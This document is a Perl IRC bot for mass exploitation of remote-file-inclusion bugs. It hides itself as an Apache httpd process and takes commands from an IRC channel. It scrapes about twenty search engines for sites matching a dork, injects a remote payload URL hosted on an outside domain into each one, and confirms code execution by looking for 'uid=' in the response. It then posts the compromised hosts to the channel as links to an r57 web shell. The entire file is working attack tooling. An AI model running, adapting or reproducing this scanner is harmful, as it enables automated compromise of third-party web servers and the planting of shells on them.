#!/usr/local/lib/perl5/5.8.6/perl
#Autore Super

use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;

my $autore="Super";
my $group="STeam";
my $processo = "/usr/local/apache/bin/httpd -DSSL";
my $cmd="http://carnatz.as.ro/mic22.txt";
my $r57="http://bobatka.info/modules/language/asc/asc/r7?";
my $server="irc.virtual.ns0.it";
my $porta="6667";
my $nick="MioScannerNew";
my $canale="#steam";
my $versione="7.0";
my $pid=fork;
exit if $pid;
$0="$processo"."\0"x16;
my $sk = IO::Socket::INET->new(PeerAddr=>"$server",PeerPort=>"$porta",Proto=>"tcp") or die "Can not connect on server!\n";
$sk->autoflush(1);
print $sk "NICK $nick\r\n";
print $sk "USER STeamBot 8 *  : STeam : STeam@google.it : Super :SBot\r\n";
print $sk "JOIN $canale\r\n";

while($line = <$sk>){

$line =~ s/\r\n$//;
if ($line=~ /^PING \:(.*)/)
{
print "PONG :$1";
print $sk "PONG :$1";
}

if ($line=~ /PRIVMSG $canale :!info/){
scrivi($sk, "PRIVMSG $canale : 4Scanner Versione $versione by $autore $group Group");
scrivi($sk, "PRIVMSG $canale : 7Per scannare !scan Bug Dork");
scrivi($sk, "PRIVMSG $canale : 7Per le stringhe  11!strings");
scrivi($sk, "PRIVMSG $canale : 11r57 !r57");
scrivi($sk, "PRIVMSG $canale : 7No Patch or MassKick and AutoPatch in my CMD");
scrivi($sk, "PRIVMSG $canale : 13Buona Scansione a Tutti");
}

if ($line=~ /PRIVMSG $canale :!strings/){
scrivi($sk, "PRIVMSG $canale : 0,4 STRINGS http://www.xshqiptaretx.org/strings.txt");
}

if ($line=~ /PRIVMSG $canale :!r57/){
scrivi($sk, "PRIVMSG $canale : 11 r57 $r57");
}


if ($line=~ /PRIVMSG $canale :!scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
scrivi($sk, "PRIVMSG $canale : 15( 7@ 11Scan 15)( 13$bug 15)");
scrivi($sk, "PRIVMSG $canale : 15( 7@ 11Scan 15)( 13$chiave 15)");
scrivi($sk, "PRIVMSG $canale : 4Scansione in Corso ATTENDERE PREGO...");
scrivi($sk, "PRIVMSG $canale : 15( 7@ 11Scan 15)( 13GoogleIT  7Searching...)");
my @glist=&googleit($chiave);
scrivi($sk, "PRIVMSG $canale : 15( 7@ 11Scan 15)( 13MSN  7Searching...)");
my @mlist=&msn($chiave);
scrivi($sk, "PRIVMSG $canale : 15( 7@ 11Scan 15)( 13Altavista  7Searching...)");
my @alist=&altavista($chiave);
scrivi($sk, "PRIVMSG $canale : 15( 7@ 11Scan 15)( 13AoL  7Searching...)");
my @aollist=&aol($chiave);
scrivi($sk, "PRIVMSG $canale : 15( 7@ 11Scan 15)( 13Google  7Searching...)");
my @google=google($chiave);
scrivi($sk, "PRIVMSG $canale : 15( 7@ 11Scan 15)( 13Search  7Searching...)");
my @searchlist=&search($chiave);
scrivi($sk, "PRIVMSG $canale : 15( 7@ 11Scan 15)( 13Alice  7Searching...)");
my @alicelist=&alice($chiave);
scrivi($sk, "PRIVMSG $canale : 15( 7@ 11Scan 15)( 13Search2  7Searching...)");
my @search2list=&search2($chiave);
scrivi($sk, "PRIVMSG $canale : 15( 7@ 11Scan 15)( 13Abacho  7Searching...)");
my @abacholist=&abacho($chiave);
scrivi($sk, "PRIVMSG $canale : 15( 7@ 11Scan 15)( 13Ask  7Searching...)");
my @asklist=&ask($chiave);
scrivi($sk, "PRIVMSG $canale : 15( 7@ 11Scan 15)( 13Ask2  7Searching...)");
my @ask2=ask2($chiave);
scrivi($sk, "PRIVMSG $canale : 15( 7@ 11Scan 15)( 13OldGoogle  7Searching...)");
my @oldgooglelist=&oldgoogle($chiave);
scrivi($sk, "PRIVMSG $canale : 15( 7@ 11Scan 15)( 13Libero  7Searching...)");
my @llist=&libero($chiave);
scrivi($sk, "PRIVMSG $canale : 15( 7@ 11Scan 15)( 13Mamma  7Searching...)");
my @mammalist=&mamma($chiave);
scrivi($sk, "PRIVMSG $canale : 15( 7@ 11Scan 15)( 13UoL  7Searching...)");
my @uollist=&uol($chiave);
scrivi($sk, "PRIVMSG $canale : 15( 7@ 11Scan 15)( 13Siti  7Trovati per  15 $chiave)");
scrivi($sk, "PRIVMSG $canale : 15( 7@ 11Scan 15)( 13GoogleIT 7: 12".scalar(@glist)." Siti |  13MSN 7: 12".scalar(@mlist)." Siti |  13Altavista 7: 12".scalar(@alist)." Siti |  13AoL 7: 12".scalar(@aollist)." Siti |  13Google 7: 12".scalar(@google)." Siti |  13Search 7: 12".scalar(@searchlist)." Siti |  13Alice 7: 12".scalar(@alicelist)." Siti |  13Search2 7: 12".scalar(@search2list)." Siti |  13Abacho 7: 12".scalar(@abacholist)." Siti |  13Ask2 7: 12".scalar(@ask2)." Siti "); 
scrivi($sk, "PRIVMSG $canale : 13Ask 7: 12".scalar(@asklist)." Siti |  13OldGoogle 7: 12".scalar(@oldgooglelist)." Siti |  13Libero 7: 12".scalar(@llist)." Siti |  13Mamma 7: 12".scalar(@mammalist)." Siti |  13Uol 7: 12".scalar(@uollist)." Siti )");
push(my @tot, @glist, @mlist, @alist, @llist, @allist, @asklist, @aollist, @google, @searchlist, @mygooglelist, @alicelist, @search2list, @abacholist, @ask2, @oldgooglelist, @RadarWeb, @BrBusca, @Websearch, @cadelist, @miragolist, @fireball, @mammalist, @uollist);
scrivi($sk, "PRIVMSG $canale : 9Totale  11Trovati  ".scalar(@tot)."  15Siti ");
my @puliti=&unici(@tot);
scrivi($sk, "PRIVMSG $canale : 9Puliti  ".scalar(@puliti)."  15Siti ");
scrivi($sk, "PRIVMSG $canale : 9Scan  11Vulnerabilita' ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %30==0){ 
scrivi($sk, "PRIVMSG $canale : 9Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale : 13Finito  $chiave");
}
my $test="http://".$sito.$bug.$cmd."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :  4SafeMode  (  7 OFF   )  9Sys ( 11 $type  )  15Free( 8 $space  )   13 $print");
scrivi($sk, "PRIVMSG Super :  4SafeMode  (  7 OFF   )  9Sys ( 11 $type  )  15Free( 8 $space  )   13 $print");
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :  4SafeMode  (  7 ON   )  9Sys ( 11 $type  )  15Free( 8 $space  )   13 $print");
}}
}}}
exit;
}}}


sub scrivi()
{
if ($#_ == '1') {
my $sk = $_[0];
print $sk "$_[1]\n";
} else {
print $sk "$_[0]\n";
}}

sub os(){
my $sito=$_[0];
my $Res=query($sito);
my $type;
my $free;
my $str;
while($Res=~m/<br>OSTYPE:(.+?)\<br>/g){
$type=$1;
}
while($Res=~m/<br>Free:(.+?)\<br>/g){
$free=$1;
}
$str=$type.",".$free;
return $str;
}

sub aol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=100;$b++){
my $AoL=("http://search.aol.com/aol/search?query=".key($key)."&page=".$b."&nt=null&ie=UTF-8");
my $Res=query($AoL);
while($Res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub googleit(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.it/search?hl=it&q=".key($key)."&num=100&filter=0&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub altavista(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub msn(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&first=".$b."&FORM=PERE");
my $Res=query($MsN);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub libero(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0,$pg=0; $i<=1000; $i+=10,$pg++)
{
my $Lib=("http://arianna.libero.it/search/abin/integrata.cgi?s=1&pag=".$pg."&start=".$i."&query=".key($key));
my $Res=query($Lib);
while($Res =~ m/<a class=\"testoblu\" href=\"?http:\/\/([^>\"]*)\//g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub ask(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=10)
{
my $Ask=("http://it.ask.com/web?q=".key($key)."&o=312&l=dir&qsrc=0&page=".$i."&dm=all");
my $Res=query($Ask);
while($Res=~m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g){
my $k=$3;
$k=~s/[\"\ ]//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub alltheweb()
{
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=100)
{
my $all=("http://www.alltheweb.com/search?&q=".key($key)."&rys=0&o=".$i);
my $Res=query($all);
while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub google {
my $inizio=0;
my $pagine=550;
my $chiave=$_[0];
$chiave =~ s/ /\%2B/g;
$chiave =~ s/:/\%253A/g;
$chiave =~ s/\//\%252F/g;
$chiave =~ s/&/\%2526/g;
$chiave =~ s/"/\%2522/g;
$chiave =~ s/\\/\%255C/g;
my $av=10;
my @lista;
while($inizio <= $pagine){
my $google="http://www.google.co.th/search?&q=$chiave&num=$pagine&start=$av";
my $req=HTTP::Request->new(GET=>$google);
my $ua=LWP::UserAgent->new();
$ua->agent('Netscape 4.78/U.S., 25-Jun-01; (c) 1995-2000');
my $response=$ua->request($req);
my $resp=$response->content;
while ($resp=~ m/<a href=\"?http:\/\/(.+?)\//g ){
my $ok="$1/";
push(@lista,$ok);
}
$inizio++;
$num=$num+10;
$pag++;
}
return @lista;
}

sub search(){
my @lst;
my $key = $_[0];
for($b=1;$b<=100;$b++){
my $sc=("http://www.search.com/search?q=".key($key)."&nav=".$b);
my $Res=query($sc);
while($Res =~ m/<a href=\"?http:\/\/(.+?)/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub search2(){
my @lst;
my $key = $_[0];
for($b=1;$b<=100;$b++){
my $se=("http://www.search.ch/search.html?rank=".$b."&q=".key($key)."&loc=ch");
my $Res=query($se);
while($Res =~ m/<a href=\"?http:\/\/(.+?)/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}


sub abacho(){
my @lst;
my $key = $_[0];
for($b=1;$b<=100;$b++){
my $aba=("http://search.abacho.com/it/abacho.it/index.cfm?q=".key($key));
my $Res=query($aba);
while($Res =~ m/<a href=\"?http:\/\/(.+?)/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}


sub mygoogle {
my $pag=0;
my $pagine=1000;
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/"/\%22/g;
$chiave =~ s/\\/\%5C/g;
my @lista;
while($pag <= $pagine) {
my $ask="http://google.com.ar/search?num=100&safe=off&q=$chiave&start=$pag";
my $req=HTTP::Request->new(GET=>$ask);
my $ua=LWP::UserAgent->new();
$ua->agent('Netscape 4.78/U.S., 25-Jun-01; (c) 1995-2000');
my $response=$ua->request($req);
my $resp=$response->content;
while ($resp=~ m/=\"?http:\/\/(.+?)\//g ){
my $ok="$1/";
push(@lista,$ok);
}
$pag=$pag+100;
}
return @lista;
}

sub altavista2(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/"/\%22/g;
$chiave =~ s/\\/\%5C/g;
my $inizio=0;
my $pagine=150;
my $av=0;
while($inizio <= $pagine){
my $altavista="http://www.altavista.com/web/results?itag=ody&kgs=3&q=$chiave&stq=$av";
my $req=HTTP::Request->new(GET=>$altavista);
my $ua=LWP::UserAgent->new();
$ua->agent('Netscape 4.78/U.S., 25-Jun-01; (c) 1995-2000');
my $response=$ua->request($req);
my $resp=$response->content;
while ($resp=~ m/<span class=ngrn>(.+?)\//g ){
my @words = split /\</, $1;
my @worde = split /\ /, $words[0];
my $ok="$worde[0]/";
push(@lista,$ok);
}
$inizio++;
$av=$av+10;
}
return @lista;
}

sub mozbot(){
my $inizio=0;
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/"/\%22/g;
$chiave =~ s/\\/\%5C/g;
my $pagine=52;
my $num=0;
my @lista;
while ($inizio <= $pagine){
my $myspace="http://www.mozbot.fr/search?q=$chiave&st=int&page=$num";
my $req=HTTP::Request->new(GET=>$myspace);
my $ua=LWP::UserAgent->new();
$ua->agent('Netscape 4.78/U.S., 25-Jun-01; (c) 1995-2000');
my $response=$ua->request($req);
my $resp=$response->content;
while ($resp =~  m/<a href=\"?http:\/\/(.+?)\"/g){
if ($1 !~ m/google|cache|translate/){
my $ok = $1;
my @words = split /\//, $ok;
my $oks="$words[0]/";
push (@lista, $oks);
}}
$inizio++;
$num=$num+1;
}
return @lista;
}

sub hotbot {
my $pag=0;
my $pagine=200;
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/"/\%22/g;
$chiave =~ s/\\/\%5C/g;
my @lista;
while($pag <= $pagine) {
my $ask="http://hotbot.com/index.php?query=$chiave&adf=off&first=$pag";
my $req=HTTP::Request->new(GET=>$ask);
my $ua=LWP::UserAgent->new();
$ua->agent('Netscape 4.78/U.S., 25-Jun-01; (c) 1995-2000');
my $response=$ua->request($req);
my $resp=$response->content;
while ($resp=~ m/class="url">http:\/\/(.+?)\//g ){
my $ok="$1/";
push(@lista,$ok);
}
$pag=$pag+10;
}
return @lista;
}

sub ask2 {
my $pag=1;
my $pagine=100;
my $chiave=$_[0];
$chiave =~ s/ /\%2B/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/"/\%22/g;
$chiave =~ s/\\/\%5C/g;
my @lista;
while($pag <= $pagine) {
my $ask="http://www.ask.com/web?q=$chiave&page=$pag";
my $req=HTTP::Request->new(GET=>$ask);
my $ua=LWP::UserAgent->new();
$ua->agent('Netscape 4.78/U.S., 25-Jun-01; (c) 1995-2000');
my $response=$ua->request($req);
my $resp=$response->content;
while ($resp=~ m/href=\"?http:\/\/(.+?)\//g ){
my $ok="$1/";
push(@lista,$ok);
}
$pag++;
}
return @lista;
}

sub oldgoogle(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go1=("www.google.com/search?q=".key($key)."&num=100&filter=0&start=".$b);
my $Res=query($Go1);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub Websearch(){
my $inizio=0;
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/"/\%22/g;
$chiave =~ s/\\/\%5C/g;
my $pagine=14;
my @lista;
while ($inizio <= $pagine){
my $av= ($inizio * 100) +1;
my $Websearch="http://www.websearch.com/search/results.aspx?qcat=$chiave&Tbid=$av";
my $req=HTTP::Request->new(GET=>$Websearch);
my $ua=LWP::UserAgent->new();
$ua->agent('Netscape 4.78/U.S., 25-Jun-01; (c) 1995-2000');
my $response=$ua->request($req);
my $resp=$response->content;
while ($resp=~ m/<a href=\"?http:\/\/(.+?)\//g ){
if ($1 !~ /Websearch|msn|live|google|yahoo/){
my $ok="$1/";
push(@lista,$ok);
}}
$av=$av+10;
$inizio++;
}
return @lista;
}

sub BrBusca(){
my $inizio=0;
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/"/\%22/g;
$chiave =~ s/\\/\%5C/g;
my $pagine=14;
my @lista;
while ($inizio <= $pagine){
my $av= ($inizio * 100) +1;
my $BrBusca="http://brbrasil.com.br/cgi-local/brbusca/brbusca.cgi?query=$chiave&where=$av";
my $req=HTTP::Request->new(GET=>$BrBusca);
my $ua=LWP::UserAgent->new();
$ua->agent('Netscape 4.78/U.S., 25-Jun-01; (c) 1995-2000');
my $response=$ua->request($req);
my $resp=$response->content;
while ($resp=~ m/<a href=\"?http:\/\/(.+?)\//g ){
if ($1 !~ /BrBusca|msn|live|google|yahoo/){
my $ok="$1/";
push(@lista,$ok);
}}
$av=$av+10;
$inizio++;
}
return @lista;
}

sub RadarWeb(){
my $inizio=0;
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/"/\%22/g;
$chiave =~ s/\\/\%5C/g;
my $pagine=14;
my @lista;
while ($inizio <= $pagine){
my $av= ($inizio * 100) +1;
my $RadarWeb="http://www.radarweb.com.br/web?q=$chiave&=$av";
my $req=HTTP::Request->new(GET=>$RadarWeb);
my $ua=LWP::UserAgent->new();
$ua->agent('Netscape 4.78/U.S., 25-Jun-01; (c) 1995-2000');
my $response=$ua->request($req);
my $resp=$response->content;
while ($resp=~ m/<a href=\"?http:\/\/(.+?)\//g ){
if ($1 !~ /RadarWeb|msn|live|google|yahoo/){
my $ok="$1/";
push(@lista,$ok);
}}
$av=$av+10;
$inizio++;
}
return @lista;
}

sub cade(){
my $inizio=0;
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/"/\%22/g;
$chiave =~ s/\\/\%5C/g;
my $pagine=14;
my @lista;
while ($inizio <= $pagine){
my $av= ($inizio * 100) +1;
my $cade="http://cade.search.yahoo.com/search?p=$chiave&n=100&fr=sfp&b=$av";
my $req=HTTP::Request->new(GET=>$cade);
my $ua=LWP::UserAgent->new();
$ua->agent('Netscape 4.78/U.S., 25-Jun-01; (c) 1995-2000');
my $response=$ua->request($req);
my $resp=$response->content;
while ($resp=~ m/<a href=\"?http:\/\/(.+?)\//g ){
if ($1 !~ /cade|msn|live|google|yahoo/){
my $ok="$1/";
push(@lista,$ok);
}}
$av=$av+10;
$inizio++;
}
return @lista;
}

sub mirago(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/"/\%22/g;
$chiave =~ s/\\/\%5C/g;
my $inizio=1;
my $pagine=50;
my @lista;
my $av=0;
while($inizio <= $pagine){
my $mirago="http://www.mirago.de/scripts/qhandler.aspx?qry=$chiave&sec=0&qtab=0&ass=4147&x=15&y=$av";
my $req=HTTP::Request->new(GET=>$mirago);
my $ua=LWP::UserAgent->new();
$ua->agent('Netscape 4.78/U.S., 25-Jun-01; (c) 1995-2000');
my $response=$ua->request($req);
my $resp=$response->content;
while ($resp=~ m/<a href=\"?http:\/\/(.+?)\//g ){
if ($1 !~ /msn|live|google|yahoo/){
my $ok="$1/";
push(@lista,$ok);
}}
$av=$av+10;
$inizio++;
}
return @lista;
}


sub fireball(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/"/\%22/g;
$chiave =~ s/\\/\%5C/g;
my $inizio=1;
my $pagine=50;
my @lista;
my $av=0;
while($inizio <= $pagine){
my $fireball="http://suche.fireball.de/cgi-bin/pursuit?pag=$av&query=$chiave&cat=fb_loc&idx=all&enc=utf-8";
my $req=HTTP::Request->new(GET=>$fireball);
my $ua=LWP::UserAgent->new();
$ua->agent('Netscape 4.78/U.S., 25-Jun-01; (c) 1995-2000');
my $response=$ua->request($req);
my $resp=$response->content;
while ($resp=~ m/<a href=\"?http:\/\/(.+?)\//g ){
if ($1 !~ /msn|live|google|yahoo/){
my $ok="$1/";
push(@lista,$ok);
}}
$av=$av+10;
$inizio++;
}
return @lista;
}


sub mamma(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0,$pg=0; $i<=1000; $i+=10,$pg++)
{
my $mami=("http://www.mamma.com/Mamma?utfout=".$pg."&qtype=0&query=".key($key));
my $Res=query($mami);
while($Res =~ m/<a href=\"?http:\/\/(.+?)\//g ){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub alice(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0,$pg=0; $i<=1000; $i+=10,$pg++)
{
my $ali=("http://search.alice.it/search/cgi/search.cgi?f=hp&offset=".$pg."&hits=10&qs=".key($key));
my $Res=query($ali);
while($Res =~ m/<a href=\"?http:\/\/(.+?)\//g ){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub uol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $UoL=("http://busca.uol.com.br/www/index.html?q=".key($key)."&start=".$i);
my $Res=query($UoL);
while($Res =~ m/<a href=\"http:\/\/([^>\"]*)/g){
my $k=$1;
if($k!~/busca|uol|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}


sub gigablast(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/"/\%22/g;
$chiave =~ s/\\/\%5C/g;
my $inizio=1;
my $pagine=25;
my @lista;
my $av=1;
while($inizio <= $pagine){
my $gigablast="http://www.gigablast.com/search?q=$chiave3D&n=30&k1f=288093&n=30";
my $req=HTTP::Request->new(GET=>$gigablast);
my $ua=LWP::UserAgent->new();
$ua->agent('Netscape 4.78/U.S., 25-Jun-01; (c) 1995-2000');
my $response=$ua->request($req);
my $resp=$response->content;
while ($resp=~ m/<a href=\"?http:\/\/(.+?)\//g ){
if ($1 !~ /msn|live|google|yahoo/){
my $ok="$1/";
push(@lista,$ok);
}}
$av=$av+10;
$inizio++;
}
return @lista;
}


sub links()
{
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub key(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/\"/\%22/g;
$chiave =~ s/,/\%2C/g;
$chiave =~ s/\\/\%5C/g;
return $chiave;
}

sub query($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$host=~s/href=\"?http:\/\///;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
return $page;
}

sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}   
return @unici;
}